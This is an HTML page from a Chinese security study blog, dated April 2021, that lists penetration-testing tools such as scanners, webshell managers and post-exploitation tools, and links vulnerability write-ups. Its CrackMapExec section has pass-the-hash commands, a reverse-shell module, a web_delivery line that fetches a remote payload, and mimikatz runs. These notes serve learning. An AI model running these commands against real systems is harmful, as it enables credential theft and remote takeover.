@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Olist.213">
+  <meta name="description" content="一点牢骚">
+  
+  
+  <link rel="prev" href="https://olist213.github.io/study_book/time-2021-04-19/" />
+  <link rel="next" href="https://olist213.github.io/study_book/time-2021-04-21-1/" />
+  <link rel="canonical" href="https://olist213.github.io/study_book/time-2021-04-21/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Time 2021 04 20 | Olist.213
+       
+  </title>
+  <meta name="title" content="Time 2021 04 20 | Olist.213">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/olist213.github.io"
+    },
+    "articleSection" : "study_book",
+    "name" : "Time 2021 04 20",
+    "headline" : "Time 2021 04 20",
+    "description" : "等保培训  关键信息基础设施  PenTest-Tools 1、domainname 域名搜集工具\n2、webscan web扫描工具\n  3xp10it\n  AngelSword\n Python3编写的CMS漏洞检测框架    AutoSploit\n Automated Mass Exploiter(远程\/外网)    AZScanner\n 自动漏洞扫描器，自动子域名爆破，自动爬取注入，调用sqlmapapi检测注入，端口扫描，目录爆破，子网段服务探测及其端口扫描，常用框架漏洞检测。    BBScan\n A fast vulnerability scanner    cansina\n Web Content Discovery Tool    Fast_Scan\n Quick and Dirty full-connect scanner. .\/fastscan 192.169.1.1    FingerPrint\n  F-MiddlewareScan\n  实现针对中间件的自动化检测，端口探测-\u0026gt;中间件识别-\u0026gt;漏洞检测-\u0026gt;获取webshell",
+    "inLanguage" : "zh-cn",
+    "author" : "Grayash",
+    "creator" : "Grayash",
+    "publisher": "Grayash",
+    "accountablePerson" : "Grayash",
+    "copyrightHolder" : "Grayash",
+    "copyrightYear" : "2021",
+    "datePublished": "2021-04-20 09:10:48 \u002b0800 CST",
+    "dateModified" : "2021-04-20 09:10:48 \u002b0800 CST",
+    "url" : "https:\/\/olist213.github.io\/study_book\/time-2021-04-21\/",
+    "wordCount" : "297",
+    "keywords" : [ "等保", "Olist.213"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Time 2021 04 20</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://olist213.github.io" rel="author">Grayash</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2021-04-20 itemprop="datePublished">April 20, 2021</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p><img src="/images/time-2021-04-21.assets/wallhaven-x8lp7z.jpg" alt="wallhaven-x8lp7z"></p>
+<h1 id="等保培训">等保培训</h1>
+<ul>
+<li>关键信息基础设施</li>
+</ul>
+<h1 id="pentest-toolshttpsgithubcomugksoftpentest-tools"><a href="https://github.com/ugksoft/PenTest-Tools">PenTest-Tools</a></h1>
+<p><strong>1、domainname 域名搜集工具</strong></p>
+<p><strong>2、webscan web扫描工具</strong></p>
+<ul>
+<li>
+<p><del>3xp10it</del></p>
+</li>
+<li>
+<p><a href="https://github.com/Lucifer1993/AngelSword">AngelSword</a></p>
+<ul>
+<li>Python3编写的CMS漏洞检测框架</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/NullArray/AutoSploit">AutoSploit</a></p>
+<ul>
+<li>Automated Mass Exploiter(远程/外网)</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/az0ne/AZScanner">AZScanner</a></p>
+<ul>
+<li>自动漏洞扫描器，自动子域名爆破，自动爬取注入，调用sqlmapapi检测注入，端口扫描，目录爆破，子网段服务探测及其端口扫描，常用框架漏洞检测。</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/lijiejie/BBScan">BBScan</a></p>
+<ul>
+<li>A fast vulnerability scanner</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/deibit/cansina">cansina</a></p>
+<ul>
+<li>Web Content Discovery Tool</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/magisterquis/fastscan">Fast_Scan</a></p>
+<ul>
+<li>Quick and Dirty full-connect scanner.</li>
+<li><code>./fastscan 192.169.1.1</code></li>
+</ul>
+</li>
+<li>
+<p><del>FingerPrint</del></p>
+</li>
+<li>
+<p><a href="https://github.com/y1ng1996/F-MiddlewareScan">F-MiddlewareScan</a></p>
+<ul>
+<li>
+<p>实现针对中间件的自动化检测，端口探测-&gt;中间件识别-&gt;漏洞检测-&gt;获取webshell</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python F-MiddlewareScan.py -h 10.111.1
+python F-MiddlewareScan.py -h 192.168.1.1-192.168.2.111
+python F-MiddlewareScan.py -h 10.111.1.22 -p 80,7001,8080 -m <span style="color:#ae81ff">200</span> -t <span style="color:#ae81ff">6</span>
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><a href="http://www.8sec.cc/index.php/archives/381/">GetTitle</a></p>
+<ul>
+<li><code>gettitle.exe 192.168.1/192.168 80,8080,8181,8000 100</code></li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/repoog/GitPrey">GitPrey</a></p>
+<ul>
+<li>GitHub敏感信息扫描工具</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/fcavallarin/htcap">htcap</a></p>
+<ul>
+<li>htcap is a web application scanner able to crawl single page application (SPA) recursively by intercepting ajax calls and DOM changes.</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/zer0h/httpscan">httpscan</a></p>
+<ul>
+<li>
+<p>httpscan是一个扫描指定CIDR网段的Web主机的小工具。和端口扫描器不一样，httpscan是以爬虫的方式进行Web主机发现，因此相对来说不容易被防火墙拦截。</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./httpscan.py 10.20.30.0/24 –t <span style="color:#ae81ff">10</span>
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><del>lalascan</del></p>
+</li>
+<li>
+<p><a href="https://github.com/RASSec/pentestER-Fully-automatic-scanner">pentestEr_Fully-automatic-scanner</a></p>
+<ul>
+<li>定向全自动化渗透测试</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/w-digital-scanner/w9scan">w9scan</a></p>
+<ul>
+<li>全能型的网站漏洞扫描器</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/K8Cscan5.4_20191101.rar">K8Cscan</a></p>
+</li>
+<li>
+<p><a href="https://github.com/nil0x42/phpsploit">phpsploit</a></p>
+</li>
+<li>
+<p><del>RED_HAWK</del></p>
+</li>
+<li>
+<p><del>S7scan</del></p>
+</li>
+<li>
+<p><del>Scan-T</del></p>
+</li>
+<li>
+<p><del>Spaghetti</del></p>
+</li>
+<li>
+<p><del>XAttacker</del></p>
+</li>
+<li>
+<p><del>truffleHog</del></p>
+</li>
+<li>
+<p><del>WAFNinja</del></p>
+</li>
+<li>
+<p><del>weakfilescan</del></p>
+</li>
+<li>
+<p><del>webvulscan</del></p>
+</li>
+<li>
+<p><a href="https://github.com/Nitr4x/whichCDN">whichCDN</a></p>
+<ul>
+<li>CDN探测</li>
+</ul>
+</li>
+<li>
+<p><del>Sn1per</del></p>
+</li>
+<li>
+<p><a href="https://github.com/NoorQureshi/WPSeku-1">WPSeku</a></p>
+<ul>
+<li>Wordpress Security Scanner</li>
+</ul>
+</li>
+</ul>
+<p><strong>3、web fuzz工具</strong></p>
+<p><strong>4、webshell工具</strong></p>
+<ul>
+<li>antSword</li>
+<li>Cknife</li>
+<li>冰蝎</li>
+<li>godzilla</li>
+</ul>
+<p><strong>5、后渗透利用工具</strong></p>
+<h1 id="night"><strong>Night</strong></h1>
+<p><em><strong>～今日份漏洞学习～</strong></em></p>
+<ul>
+<li>
+<p><a href="https://m.threatbook.cn/detail/6192">weblogic T3 0day</a></p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/OxeYufM-ZX_SdbV5zjWV7A">Weblogic T3分析文章</a></li>
+<li><a href="https://github.com/DesaiParekh/weblogic_cmd_plus">github利用工具</a></li>
+</ul>
+</li>
+<li>
+<p><a href="https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3897">金蝶天燕V9.0版本 任意文件上传漏洞</a></p>
+</li>
+<li>
+<p><a href="https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3896">Coremail系统tomcat管理后台权限绕过漏洞</a></p>
+</li>
+</ul>
+<p><strong><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">～PayloadsAllTheThings学习～</a></strong></p>
+<ul>
+<li>
+<p><a href="https://github.com/maaaaz/impacket-examples-windows">impacket</a></p>
+</li>
+<li>
+<p><a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a></p>
+<ul>
+<li>Windows C# LLMNR/mDNS/NBNS/DNS/DHCPv6 spoofer/man-in-the-middle tool</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">Active Directory资源管理器</a></p>
+</li>
+<li>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p>
+<ul>
+<li>
+<p>CrackMapExec（又称CME）是一个后渗透工具，有助于自动评估AD的安全性。</p>
+</li>
+<li>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec/releases">二进制下载</a></p>
+</li>
+<li>
+<p>基础语法</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># use the latest release, CME is now a binary packaged will all its dependencies</span>
+root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
+    
+<span style="color:#75715e"># execute cme (smb, winrm, mssql, ...)</span>
+root@payload$ cme smb -L
+root@payload$ cme smb -M name_module -o VAR<span style="color:#f92672">=</span>DATA
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
+root@payload$ cme smb 192.168.1.100 -u Administrator -H <span style="color:#e6db74">&#39;:5858d47a41e40b40f294b3100bea611f&#39;</span> -d <span style="color:#e6db74">&#39;DOMAIN&#39;</span> -M invoke_sessiongopher
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION<span style="color:#f92672">=</span>enable
+root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST<span style="color:#f92672">=</span>192.168.1.63 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4443</span>
+root@payload$ cme smb 192.168.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> -M web_delivery -o URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://IP:PORT/posh-payload&#34;</span>
+root@payload$ cme smb 192.168.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> --exec-method smbexec -X <span style="color:#e6db74">&#39;whoami&#39;</span>
+root@payload$ cme smb 10.10.14.0/24 -u user -p <span style="color:#e6db74">&#39;Password&#39;</span> --local-auth -M mimikatz
+root@payload$ cme mimikatz --server http --server-port <span style="color:#ae81ff">80</span>
+</code></pre></div></li>
+<li>
+<p><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a></p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.<span style="color:#ae81ff">\A</span>DRecon.ps1 -DomainController MYAD.net -Credential MYAD<span style="color:#ae81ff">\m</span>yuser
+</code></pre></div></li>
+<li>
+<p><a href="https://github.com/hausec/ADAPE-Script">Active Directory Assessment and Privilege Escalation Script</a></p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
+</code></pre></div></li>
+<li></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Olist.213 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://olist213.github.io/study_book/time-2021-04-21/>https://olist213.github.io/study_book/time-2021-04-21/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="https://olist213.github.io/tags/%E7%AD%89%E4%BF%9D/">
+                    #等保</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://olist213.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://olist213.github.io/study_book/time-2021-04-19/" class="prev" rel="prev" title="Time 2021 04 19"><i class="iconfont icon-left"></i>&nbsp;Time 2021 04 19</a>
+         
+        
+        <a href="https://olist213.github.io/study_book/time-2021-04-21-1/" class="next" rel="next" title="Time 2021 04 21">Time 2021 04 21&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2021</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
